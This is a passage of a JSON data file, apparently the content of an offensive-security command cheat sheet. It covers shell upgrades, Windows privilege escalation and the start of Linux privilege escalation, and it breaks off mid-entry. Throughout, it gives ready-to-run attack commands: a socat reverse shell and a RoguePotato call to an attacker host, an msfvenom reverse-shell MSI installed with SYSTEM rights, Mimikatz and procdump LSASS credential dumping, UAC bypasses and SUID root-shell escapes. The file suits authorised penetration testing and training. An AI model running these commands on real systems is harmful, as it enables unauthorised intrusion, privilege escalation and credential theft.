            "cmd": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Python2 PTY Spawn",
            "desc": "Spawn a PTY shell with Python2",
            "cmd": "python -c 'import pty;pty.spawn(\"/bin/bash\")'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Script PTY Spawn",
            "desc": "Spawn a PTY with script command",
            "cmd": "script /dev/null -c bash",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Full TTY Upgrade Process",
            "desc": "Complete process to get a fully interactive shell",
            "cmds": [
              "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
              "# Press Ctrl+Z to background the shell",
              "stty raw -echo; fg",
              "export TERM=xterm",
              "stty rows <ROWS> cols <COLS>"
            ],
            "tags": [
              "essential"
            ],
            "note": "Get your terminal size with: stty size"
          },
          {
            "title": "Expect PTY Spawn",
            "desc": "Spawn PTY via expect",
            "cmd": "/usr/bin/expect -c 'spawn /bin/bash; interact'",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Socat TTY Upgrade",
            "desc": "Upgrade shell to full TTY via socat",
            "cmds": [
              "# On attacker: socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>",
              "# On target: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>"
            ],
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Rlwrap for Windows Shells",
            "desc": "Use rlwrap for arrow key support on Windows shells",
            "cmd": "rlwrap nc -lvnp <LPORT>",
            "tags": [
              "essential"
            ],
            "note": "Essential for Windows reverse shells which don't support arrow keys"
          },
          {
            "title": "Export TERM Variable",
            "desc": "Set TERM for proper terminal behavior",
            "cmd": "export TERM=xterm-256color",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Fix Shell PATH",
            "desc": "Set PATH for full command availability",
            "cmd": "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            "tags": [
              "essential"
            ]
          }
        ]
      }
    ]
  },
  {
    "id": "win-escalation",
    "name": "Windows Privilege Escalation",
    "icon": "⬆️",
    "description": "Escalate privileges on Windows hosts through service misconfigurations, token abuse, credential harvesting, and kernel exploits.",
    "subcategories": [
      {
        "name": "System Reconnaissance",
        "commands": [
          {
            "title": "System Info",
            "desc": "Get detailed system information",
            "cmd": "systeminfo",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Hostname",
            "desc": "Get computer name",
            "cmd": "hostname",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Current User",
            "desc": "Display current username",
            "cmd": "whoami",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "User Privileges",
            "desc": "List all privileges for current user",
            "cmd": "whoami /priv",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "User Groups",
            "desc": "List all group memberships",
            "cmd": "whoami /all",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "List Local Users",
            "desc": "Enumerate all local user accounts",
            "cmd": "net user",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "User Details",
            "desc": "Get details for a specific user",
            "cmd": "net user <USER>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Local Administrators",
            "desc": "List members of administrators group",
            "cmd": "net localgroup administrators",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Network Configuration",
            "desc": "Display network adapter configuration",
            "cmd": "ipconfig /all",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Routing Table",
            "desc": "Display routing table",
            "cmd": "route print",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Active Connections",
            "desc": "Show active network connections",
            "cmd": "netstat -ano",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Running Processes",
            "desc": "List all running processes",
            "cmd": "tasklist /v",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Installed Software (WMIC)",
            "desc": "List installed software via WMIC",
            "cmd": "wmic product get name,version,vendor",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Installed Patches",
            "desc": "List installed hotfixes",
            "cmd": "wmic qfe list full",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Scheduled Tasks",
            "desc": "List all scheduled tasks",
            "cmd": "schtasks /query /fo TABLE /nh",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Firewall State",
            "desc": "Check Windows Firewall status",
            "cmd": "netsh advfirewall show allprofiles",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Antivirus Status",
            "desc": "Check installed antivirus (WMIC)",
            "cmd": "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname,productstate",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Drives List",
            "desc": "List all drives on the system",
            "cmd": "wmic logicaldisk get caption,description,freespace,size",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "WMIC Patches",
            "desc": "List installed patches",
            "cmd": "wmic qfe list full /format:csv",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Defender Status",
            "desc": "Check Defender status",
            "cmd": "Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled,AntivirusEnabled",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Defender Exclusions",
            "desc": "View excluded paths",
            "cmd": "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Firewall Rules",
            "desc": "List firewall config",
            "cmd": "netsh advfirewall show allprofiles",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Service Config",
            "desc": "Query service config",
            "cmd": "sc qc <SERVICE_NAME>",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Service Misconfigurations",
        "commands": [
          {
            "title": "List All Services",
            "desc": "Enumerate all Windows services",
            "cmd": "sc query state= all",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Service Details (SC)",
            "desc": "Get configuration details for a service",
            "cmd": "sc qc <SERVICE_NAME>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "WMIC Service Paths",
            "desc": "List service binary paths (find unquoted)",
            "cmd": "wmic service get name,displayname,pathname,startmode",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Find Unquoted Service Paths",
            "desc": "Identify services with unquoted paths containing spaces",
            "cmd": "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Check Service Permissions (accesschk)",
            "desc": "Check which services current user can modify",
            "cmd": "accesschk.exe /accepteula -uwcqv <USER> * /c",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Check Service Binary Permissions",
            "desc": "Check permissions on a service binary",
            "cmd": "icacls \"C:\\path\\to\\service.exe\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Modify Service Binary Path",
            "desc": "Change service binary to payload (if writable)",
            "cmd": "sc config <SERVICE_NAME> binpath= \"C:\\temp\\shell.exe\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Restart Service",
            "desc": "Stop and start a service",
            "cmds": [
              "sc stop <SERVICE_NAME>",
              "sc start <SERVICE_NAME>"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "DLL Hijacking Check",
            "desc": "Use Procmon to find DLL hijack opportunities",
            "cmd": "# Use Procmon filter: Result=NAME NOT FOUND, Path ends with .dll",
            "tags": [
              "advanced"
            ],
            "note": "Place malicious DLL in writable path that service searches"
          }
        ]
      },
      {
        "name": "Registry & Scheduled Tasks",
        "commands": [
          {
            "title": "AutoLogon Credentials",
            "desc": "Check registry for auto-login credentials",
            "cmd": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Putty Saved Sessions",
            "desc": "Check for stored Putty credentials",
            "cmd": "reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" /s",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "VNC Stored Passwords",
            "desc": "Check for VNC stored passwords",
            "cmd": "reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Unattend.xml Files",
            "desc": "Search for unattended install files with creds",
            "cmd": "dir /s /b C:\\*unattend*.xml C:\\*sysprep*.xml C:\\*sysprep.inf 2>nul",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Registry Run Keys",
            "desc": "Check autorun registry keys",
            "cmds": [
              "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
              "reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Scheduled Tasks Writable",
            "desc": "Find writable scheduled task binaries",
            "cmd": "schtasks /query /fo LIST /v | findstr /i \"Task To Run\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Stored Credentials (cmdkey)",
            "desc": "List cached credentials",
            "cmd": "cmdkey /list",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "RunAs with Saved Creds",
            "desc": "Execute as another user with stored credentials",
            "cmd": "runas /savecred /user:<USER> \"C:\\temp\\shell.exe\"",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Token Abuse & Impersonation",
        "commands": [
          {
            "title": "Check SeImpersonatePrivilege",
            "desc": "Check if current user has impersonation privilege",
            "cmd": "whoami /priv | findstr /i \"SeImpersonate SeAssignPrimaryToken\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "JuicyPotato",
            "desc": "Exploit SeImpersonate with JuicyPotato",
            "cmd": "JuicyPotato.exe -l <RANDOM_PORT> -p C:\\temp\\shell.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Works on Windows Server 2008-2016, Windows 7-10 (before certain patches)"
          },
          {
            "title": "PrintSpoofer",
            "desc": "Exploit SeImpersonate via print spooler",
            "cmd": "PrintSpoofer.exe -c \"C:\\temp\\shell.exe\"",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Works on Windows 10 and Server 2016/2019"
          },
          {
            "title": "GodPotato",
            "desc": "Exploit SeImpersonate with GodPotato",
            "cmd": "GodPotato.exe -cmd \"C:\\temp\\shell.exe\"",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Works on Windows Server 2012-2022, Windows 8-11"
          },
          {
            "title": "SweetPotato",
            "desc": "Exploit SeImpersonate with SweetPotato",
            "cmd": "SweetPotato.exe -e EfsRpc -p C:\\temp\\shell.exe",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "RoguePotato",
            "desc": "Exploit SeImpersonate with RoguePotato",
            "cmd": "RoguePotato.exe -r <ATTACKER_IP> -e \"C:\\temp\\shell.exe\" -l <RANDOM_PORT>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Check SeBackupPrivilege",
            "desc": "Check for backup privilege (read any file)",
            "cmd": "whoami /priv | findstr /i \"SeBackup\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Check SeRestorePrivilege",
            "desc": "Check for restore privilege (write any file)",
            "cmd": "whoami /priv | findstr /i \"SeRestore\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Check SeDebugPrivilege",
            "desc": "Check for debug privilege (access any process)",
            "cmd": "whoami /priv | findstr /i \"SeDebug\"",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SeDebugPrivilege Exploit (Mimikatz)",
            "desc": "Dump LSASS with debug privilege",
            "cmd": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
            "tags": [
              "advanced",
              "tool"
            ],
            "note": "SeDebugPrivilege allows reading any process memory"
          },
          {
            "title": "SeDebugPrivilege Procdump LSASS",
            "desc": "Dump LSASS process memory with procdump",
            "cmd": "procdump.exe -ma lsass.exe lsass.dmp -accepteula",
            "tags": [
              "advanced",
              "tool"
            ],
            "note": "Analyze dump offline with pypykatz or mimikatz"
          },
          {
            "title": "SeBackupPrivilege File Read",
            "desc": "Read any file using backup privilege",
            "cmds": [
              "Import-Module .\\SeBackupPrivilegeUtils.dll",
              "Import-Module .\\SeBackupPrivilegeCmdLets.dll",
              "Copy-FileSeBackupPrivilege C:\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit"
            ],
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SeRestorePrivilege DLL Hijack",
            "desc": "Write to any location using restore privilege",
            "cmd": "# SeRestorePrivilege allows writing any file - use to overwrite service DLLs or system binaries",
            "tags": [
              "advanced"
            ],
            "note": "Write a malicious DLL to a system path, then trigger the service"
          },
          {
            "title": "SeTakeOwnershipPrivilege",
            "desc": "Take ownership of any file and read it",
            "cmds": [
              "takeown /f C:\\path\\to\\sensitive\\file",
              "icacls C:\\path\\to\\sensitive\\file /grant <USER>:F",
              "type C:\\path\\to\\sensitive\\file"
            ],
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Check All Privileges",
            "desc": "List all current token privileges with status",
            "cmd": "whoami /priv",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Get-Acl Check Permissions",
            "desc": "Check ACL permissions on a file or directory",
            "cmd": "powershell -c \"Get-Acl 'C:\\path\\to\\file' | Format-List\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Get-Acl Service Registry",
            "desc": "Check permissions on service registry key",
            "cmd": "powershell -c \"Get-Acl 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\<SERVICE_NAME>' | Format-List\"",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "icacls Check File Permissions",
            "desc": "Check detailed file ACL permissions",
            "cmd": "icacls \"C:\\path\\to\\file\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "icacls Check Program Files",
            "desc": "Find writable directories in Program Files",
            "cmd": "icacls \"C:\\Program Files\" /T /C 2>nul | findstr /i \"(F) (M) (W) Everyone Users BUILTIN\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "icacls Check Service Binaries",
            "desc": "Check if service binary path is writable",
            "cmd": "for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a >> services.txt & icacls \"%a\" 2>nul",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "EfsPotato",
            "desc": "Exploit SeImpersonate via EFS service",
            "cmd": "EfsPotato.exe \"C:\\temp\\shell.exe\"",
            "tags": [
              "tool"
            ],
            "note": "Works on Windows 10/Server 2016-2019"
          }
        ]
      },
      {
        "name": "Credential Harvesting",
        "commands": [
          {
            "title": "Search for Passwords in Files",
            "desc": "Recursively search for password strings",
            "cmd": "findstr /si password *.txt *.ini *.config *.xml *.php",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PowerShell History",
            "desc": "Read PowerShell command history",
            "cmd": "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PowerShell History (PS)",
            "desc": "Read PS history from PowerShell",
            "cmd": "Get-Content (Get-PSReadLineOption).HistorySavePath",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "WiFi Passwords",
            "desc": "Extract saved WiFi passwords",
            "cmds": [
              "netsh wlan show profiles",
              "netsh wlan show profile name=\"<WIFI_NAME>\" key=clear"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SAM & SYSTEM Backup Files",
            "desc": "Check for accessible SAM/SYSTEM backup copies",
            "cmds": [
              "dir C:\\Windows\\Repair\\SAM",
              "dir C:\\Windows\\Repair\\SYSTEM",
              "dir C:\\Windows\\System32\\config\\RegBack\\SAM",
              "dir C:\\Windows\\System32\\config\\RegBack\\SYSTEM"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Copy SAM with Shadow Copies",
            "desc": "Extract SAM via volume shadow copies",
            "cmds": [
              "wmic shadowcopy list brief",
              "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\temp\\SAM",
              "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\SYSTEM"
            ],
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "IIS Web.config Credentials",
            "desc": "Check IIS configuration for credentials",
            "cmd": "type C:\\inetpub\\wwwroot\\web.config | findstr /i connectionString password",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Search Registry for Passwords",
            "desc": "Search registry for password entries",
            "cmd": "reg query HKLM /f password /t REG_SZ /s",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "DPAPI Credential Files",
            "desc": "Find DPAPI-protected credential files",
            "cmd": "dir /s /b C:\\Users\\*\\AppData\\*\\Microsoft\\Credentials\\*",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "DPAPI Master Keys Location",
            "desc": "Find DPAPI master key files",
            "cmd": "dir /s /b C:\\Users\\*\\AppData\\*\\Microsoft\\Protect\\*",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Mimikatz DPAPI Decrypt",
            "desc": "Decrypt DPAPI blobs with mimikatz",
            "cmd": "mimikatz.exe \"dpapi::cred /in:C:\\Users\\<USER>\\AppData\\Local\\Microsoft\\Credentials\\<CRED_FILE>\" \"exit\"",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "SharpDPAPI Triage",
            "desc": "Automated DPAPI credential extraction",
            "cmd": "SharpDPAPI.exe triage",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "Find KeePass Database Files",
            "desc": "Search for KeePass database files",
            "cmd": "dir /s /b C:\\*.kdbx 2>nul",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Find SSH Keys (Windows)",
            "desc": "Search for SSH private keys on Windows",
            "cmd": "dir /s /b C:\\Users\\*\\.ssh\\id_rsa 2>nul",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Saved RDP Credentials",
            "desc": "Check for saved RDP connection credentials",
            "cmd": "dir /s /b C:\\Users\\*\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\* 2>nul",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Find Configuration Files",
            "desc": "Search for config files with potential credentials",
            "cmd": "dir /s /b C:\\*.config C:\\*.ini C:\\*.xml C:\\*.json 2>nul | findstr /i /v \"Windows\\\\assembly Windows\\\\Microsoft.NET\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Browser Saved Passwords (SharpChromium)",
            "desc": "Extract saved browser passwords",
            "cmd": "SharpChromium.exe logins",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Snaffler Credential Finder",
            "desc": "Automated credential and secret finder across shares",
            "cmd": "Snaffler.exe -s -o snaffler_output.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "GPP cpassword",
            "desc": "Find Group Policy passwords",
            "cmds": [
              "findstr /SIM /C:\"cpassword\" \\\\<DOMAIN>\\sysvol\\<DOMAIN>\\Policies\\*.xml",
              "# Decrypt: gpp-decrypt <CPASSWORD>"
            ],
            "tags": [
              "essential"
            ],
            "note": "Check Groups.xml, Services.xml, Scheduledtasks.xml"
          },
          {
            "title": "Invoke-PrivescCheck",
            "desc": "Comprehensive privesc checker",
            "cmd": "Import-Module .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "AlwaysInstallElevated",
        "commands": [
          {
            "title": "Check AlwaysInstallElevated (HKCU)",
            "desc": "Check if AlwaysInstallElevated is enabled for user",
            "cmd": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Check AlwaysInstallElevated (HKLM)",
            "desc": "Check if AlwaysInstallElevated is enabled system-wide",
            "cmd": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Exploit AlwaysInstallElevated",
            "desc": "Install malicious MSI with SYSTEM privileges",
            "cmds": [
              "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o shell.msi",
              "msiexec /quiet /qn /i shell.msi"
            ],
            "tags": [
              "essential"
            ],
            "note": "Both HKCU and HKLM keys must be set to 1"
          }
        ]
      },
      {
        "name": "Kernel Exploits",
        "commands": [
          {
            "title": "Windows Exploit Suggester",
            "desc": "Suggest exploits based on systeminfo output",
            "cmd": "python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Watson (.NET)",
            "desc": "Find missing KBs and suggest privilege escalation",
            "cmd": "Watson.exe",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Sherlock (PowerShell)",
            "desc": "Find missing patches for known privesc",
            "cmd": "Import-Module .\\Sherlock.ps1; Find-AllVulns",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Check System Architecture",
            "desc": "Determine 32/64-bit for exploit compatibility",
            "cmd": "systeminfo | findstr /i \"System Type\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Check OS Version",
            "desc": "Get exact OS version and build",
            "cmd": "systeminfo | findstr /i /B \"OS\"",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Automated Scanners",
        "commands": [
          {
            "title": "WinPEAS",
            "desc": "Comprehensive Windows privilege escalation scanner",
            "cmd": "winPEASx64.exe",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "WinPEAS (Quiet Mode)",
            "desc": "WinPEAS with reduced output",
            "cmd": "winPEASx64.exe quiet systeminfo userinfo",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "PowerUp (PowerShell)",
            "desc": "PowerShell privilege escalation scanner",
            "cmds": [
              "Import-Module .\\PowerUp.ps1",
              "Invoke-AllChecks"
            ],
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Seatbelt",
            "desc": "Security-focused host survey tool",
            "cmd": "Seatbelt.exe -group=all",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "SharpUp",
            "desc": "C# port of PowerUp privesc checks",
            "cmd": "SharpUp.exe audit",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "PrivescCheck",
            "desc": "PowerShell privilege escalation enumeration",
            "cmds": [
              "Import-Module .\\PrivescCheck.ps1",
              "Invoke-PrivescCheck -Extended"
            ],
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Seatbelt Specific Checks",
            "desc": "Run Seatbelt with targeted security checks",
            "cmd": "Seatbelt.exe -group=user -group=system",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Seatbelt Remote Execution",
            "desc": "Run Seatbelt against a remote host",
            "cmd": "Seatbelt.exe -group=remote -computername=<TARGET_HOSTNAME> -username=<DOMAIN>\\<USER> -password=<PASS>",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "SharpUp Specific Checks",
            "desc": "Run SharpUp with specific vulnerability checks",
            "cmd": "SharpUp.exe audit HijackablePaths ModifiableServiceBinaries ModifiableServices",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "JAWS Enumeration",
            "desc": "Just Another Windows (Enum) Script",
            "cmd": "powershell -ep bypass -c \"Import-Module .\\jaws-enum.ps1\"",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Windows Exploit Suggester NG",
            "desc": "Suggest exploits from systeminfo (Python)",
            "cmd": "python wes.py systeminfo.txt -e",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Use: systeminfo > systeminfo.txt, then transfer to attacker"
          },
          {
            "title": "WinPEAS Services Info",
            "desc": "WinPEAS focused on service misconfigurations",
            "cmd": "winPEASx64.exe quiet servicesinfo",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "WinPEAS Network Info",
            "desc": "WinPEAS focused on network information",
            "cmd": "winPEASx64.exe quiet networkinfo",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "UAC Bypass",
        "commands": [
          {
            "title": "UAC — fodhelper",
            "desc": "Bypass via fodhelper",
            "cmds": [
              "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"cmd.exe /c <COMMAND>\" /f",
              "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f",
              "fodhelper.exe"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "UAC — eventvwr",
            "desc": "Bypass via Event Viewer",
            "cmds": [
              "reg add HKCU\\Software\\Classes\\mscfile\\Shell\\Open\\command /d \"cmd.exe /c <COMMAND>\" /f",
              "eventvwr.exe"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "UAC — sdclt",
            "desc": "Bypass via sdclt",
            "cmds": [
              "reg add HKCU\\Software\\Classes\\Folder\\Shell\\Open\\command /d \"cmd.exe /c <COMMAND>\" /f",
              "reg add HKCU\\Software\\Classes\\Folder\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f",
              "sdclt.exe"
            ],
            "tags": [
              "tool"
            ]
          }
        ]
      }
    ]
  },
  {
    "id": "linux-escalation",
    "name": "Linux Privilege Escalation",
    "icon": "🐧",
    "description": "Escalate privileges on Linux systems through SUID binaries, sudo misconfigurations, capabilities, cron exploitation, kernel exploits, and container escapes.",
    "subcategories": [
      {
        "name": "System Reconnaissance",
        "commands": [
          {
            "title": "Current User & ID",
            "desc": "Show current user and group memberships",
            "cmd": "id",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Kernel Version",
            "desc": "Display kernel version and architecture",
            "cmd": "uname -a",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "OS Release Info",
            "desc": "Show operating system release details",
            "cmd": "cat /etc/os-release",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Proc Version",
            "desc": "Show kernel version from proc",
            "cmd": "cat /proc/version",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Environment Variables",
            "desc": "List all environment variables",
            "cmd": "env",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Network Interfaces",
            "desc": "Show network interfaces",
            "cmd": "ip a",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Active Connections",
            "desc": "Show listening ports and connections",
            "cmd": "ss -tulnp",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Running Processes",
            "desc": "Show all running processes",
            "cmd": "ps auxf",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Installed Packages (Debian)",
            "desc": "List installed packages",
            "cmd": "dpkg -l",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Installed Packages (RHEL)",
            "desc": "List installed packages",
            "cmd": "rpm -qa",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "All Users",
            "desc": "List all users from passwd file",
            "cmd": "cat /etc/passwd",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Readable Shadow",
            "desc": "Check if shadow file is readable",
            "cmd": "cat /etc/shadow 2>/dev/null",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Home Directories",
            "desc": "List home directories and their contents",
            "cmd": "ls -la /home/",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SSH Keys",
            "desc": "Search for SSH private keys",
            "cmd": "find / -name id_rsa -o -name id_ecdsa -o -name id_ed25519 2>/dev/null",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Bash History",
            "desc": "Read bash history for all accessible users",
            "cmd": "cat ~/.bash_history 2>/dev/null; find /home -name .bash_history -exec cat {} \\; 2>/dev/null",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Installed Packages (RedHat)",
            "desc": "List RPM packages",
            "cmd": "rpm -qa",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Enabled Services",
            "desc": "List enabled services",
            "cmd": "systemctl list-unit-files --type=service --state=enabled",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Internal Port Scan",
            "desc": "Scan ports with bash",
            "cmd": "for port in 21 22 25 80 135 443 445 3306 3389 5985 8080; do (echo > /dev/tcp/127.0.0.1/$port) 2>/dev/null && echo \"Port $port open\"; done",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "SUID & SGID Abuse",
        "commands": [
          {
            "title": "Find SUID Binaries",
            "desc": "Find all SUID binaries on the system",
            "cmd": "find / -perm -4000 -type f 2>/dev/null",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Find SGID Binaries",
            "desc": "Find all SGID binaries on the system",
            "cmd": "find / -perm -2000 -type f 2>/dev/null",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Find SUID+SGID",
            "desc": "Find all SUID and SGID binaries",
            "cmd": "find / -perm -u=s -o -perm -g=s -type f 2>/dev/null",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SUID bash -p",
            "desc": "If bash has SUID, spawn root shell",
            "cmd": "bash -p",
            "tags": [
              "essential"
            ],
            "note": "GTFOBins: bash"
          },
          {
            "title": "SUID find Exec",
            "desc": "Escalate via SUID find binary",
            "cmd": "find . -exec /bin/sh -p \\; -quit",
            "tags": [
              "essential"
            ],
            "note": "GTFOBins: find"
          },
          {
            "title": "SUID vim Shell",
            "desc": "Escalate via SUID vim",
            "cmd": "vim -c ':!/bin/sh'",
            "tags": [
              "essential"
            ],
            "note": "GTFOBins: vim"
          },
          {
            "title": "SUID python Shell",
            "desc": "Escalate via SUID python",
            "cmd": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
            "tags": [
              "essential"
            ],
            "note": "GTFOBins: python"
          },
          {
            "title": "SUID nmap Interactive",
            "desc": "Escalate via SUID nmap (old versions)",
